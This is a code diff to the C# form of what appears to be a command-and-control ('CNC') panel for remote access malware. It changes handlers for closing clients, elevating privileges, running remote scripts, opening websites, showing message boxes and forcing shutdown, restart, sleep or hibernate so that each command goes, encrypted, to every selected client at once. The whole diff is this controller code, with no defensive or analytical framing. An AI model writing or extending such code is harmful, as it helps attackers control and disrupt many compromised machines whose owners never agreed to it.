@@ -83,6 +83,10 @@ namespace CNC
             }
         }
 
+
+
+        //SINGLE SELECT
+
         private void processManagerToolStripMenuItem_Click(object sender, EventArgs e)
         {
             ProcessList processListWindow = new ProcessList((Client)clientListView.FocusedItem.Tag);
@@ -97,64 +101,99 @@ namespace CNC
             }
         }
 
-        private void shutdownToolStripMenuItem_Click(object sender, EventArgs e)
-        {
-            Client client = (Client)clientListView.FocusedItem.Tag;
-            client.Connection.SendObject<string>("SetPowerStateReq", Cryptography.Encrypt(JsonConvert.SerializeObject(PowerStateE.Shutdown)));
-        }
-
-        private void restartToolStripMenuItem_Click(object sender, EventArgs e)
-        {
-            Client client = (Client)clientListView.FocusedItem.Tag;
-            client.Connection.SendObject<string>("SetPowerStateReq", Cryptography.Encrypt(JsonConvert.SerializeObject(PowerStateE.Restart)));
-        }
-
-        private void sleepToolStripMenuItem_Click(object sender, EventArgs e)
-        {
-            Client client = (Client)clientListView.FocusedItem.Tag;
-            client.Connection.SendObject<string>("SetPowerStateReq", Cryptography.Encrypt(JsonConvert.SerializeObject(PowerStateE.Sleep)));
-        }
-
-        private void hibernateToolStripMenuItem_Click(object sender, EventArgs e)
-        {
-            Client client = (Client)clientListView.FocusedItem.Tag;
-            client.Connection.SendObject<string>("SetPowerStateReq", Cryptography.Encrypt(JsonConvert.SerializeObject(PowerStateE.Hibernate)));
-        }
-
         private void remoteControllToolStripMenuItem_Click(object sender, EventArgs e)
         {
             RemoteControll remoteControllWindow = new RemoteControll((Client)clientListView.FocusedItem.Tag);
             remoteControllWindow.Show();
         }
 
-        private void elevateApplicationToolStripMenuItem_Click(object sender, EventArgs e)
-        {
-            Client client = (Client)clientListView.FocusedItem.Tag;
-            client.Connection.SendObject<string>("ElevateReq", Cryptography.Encrypt(Guid.NewGuid().ToString()));
-        }
+        //Multi select BELOW
+
 
         private void closeToolStripMenuItem1_Click(object sender, EventArgs e)
         {
-            Client client = (Client)clientListView.FocusedItem.Tag;
-            client.Connection.SendObject<string>("CloseReq", Cryptography.Encrypt(Guid.NewGuid().ToString()));
+            for (int i = 0; i < clientListView.SelectedItems.Count; i++)
+            {
+                ((Client)clientListView.SelectedItems[i].Tag).Connection.SendObject<string>("CloseReq", 
+                    Cryptography.Encrypt(Guid.NewGuid().ToString()));
+            }
         }
 
         private void openWebsiteToolStripMenuItem_Click(object sender, EventArgs e)
         {
-            OpenWebsite openWebsiteForm = new OpenWebsite((Client)clientListView.FocusedItem.Tag);
+            List<Client> clients = new List<Client>();
+            for (int i = 0; i < clientListView.SelectedItems.Count; i++)
+            {
+                clients.Add((Client)clientListView.SelectedItems[i].Tag);
+            }
+            OpenWebsite openWebsiteForm = new OpenWebsite(clients.ToArray());
             openWebsiteForm.Show();
         }
 
         private void showMessageboxToolStripMenuItem_Click(object sender, EventArgs e)
         {
-            ShowMessageBox showMessageBoxForm = new ShowMessageBox((Client)clientListView.FocusedItem.Tag);
+            List<Client> clients = new List<Client>();
+            for (int i = 0; i < clientListView.SelectedItems.Count; i++)
+            {
+                clients.Add((Client)clientListView.SelectedItems[i].Tag);
+            }
+            ShowMessageBox showMessageBoxForm = new ShowMessageBox(clients.ToArray());
             showMessageBoxForm.Show();
         }
 
         private void scriptingToolStripMenuItem_Click(object sender, EventArgs e)
         {
-            RemoteScript remoteScriptWindow = new RemoteScript((Client)clientListView.FocusedItem.Tag);
+            List<Client> clients = new List<Client>();
+            for (int i = 0; i < clientListView.SelectedItems.Count; i++)
+            {
+                clients.Add((Client)clientListView.SelectedItems[i].Tag);
+            }
+            RemoteScript remoteScriptWindow = new RemoteScript(clients.ToArray());
             remoteScriptWindow.Show();
+        }
+
+        private void elevateApplicationToolStripMenuItem_Click(object sender, EventArgs e)
+        {
+            for (int i = 0; i < clientListView.SelectedItems.Count; i++)
+            {
+                ((Client)clientListView.SelectedItems[i].Tag).Connection.SendObject<string>("ElevateReq", Cryptography.Encrypt(Guid.NewGuid().ToString()));
+            }
+        }
+
+        private void shutdownToolStripMenuItem_Click(object sender, EventArgs e)
+        {
+            for (int i = 0; i < clientListView.SelectedItems.Count; i++)
+            {
+                ((Client)clientListView.SelectedItems[i].Tag).Connection.SendObject<string>("SetPowerStateReq", 
+                    Cryptography.Encrypt(JsonConvert.SerializeObject(PowerStateE.Shutdown)));
+            }
+        }
+
+        private void restartToolStripMenuItem_Click(object sender, EventArgs e)
+        {
+            for (int i = 0; i < clientListView.SelectedItems.Count; i++)
+            {
+                ((Client)clientListView.SelectedItems[i].Tag).Connection.SendObject<string>("SetPowerStateReq",
+                    Cryptography.Encrypt(JsonConvert.SerializeObject(PowerStateE.Restart)));
+            }
+        }
+
+        private void sleepToolStripMenuItem_Click(object sender, EventArgs e)
+        {
+            for (int i = 0; i < clientListView.SelectedItems.Count; i++)
+            {
+                ((Client)clientListView.SelectedItems[i].Tag).Connection.SendObject<string>("SetPowerStateReq",
+                    Cryptography.Encrypt(JsonConvert.SerializeObject(PowerStateE.Sleep)));
+            }
+        }
+
+        private void hibernateToolStripMenuItem_Click(object sender, EventArgs e)
+        {
+            for (int i = 0; i < clientListView.SelectedItems.Count; i++)
+            {
+                ((Client)clientListView.SelectedItems[i].Tag).Connection.SendObject<string>("SetPowerStateReq",
+                    Cryptography.Encrypt(JsonConvert.SerializeObject(PowerStateE.Hibernate)));
+            }
         }
     }
 }
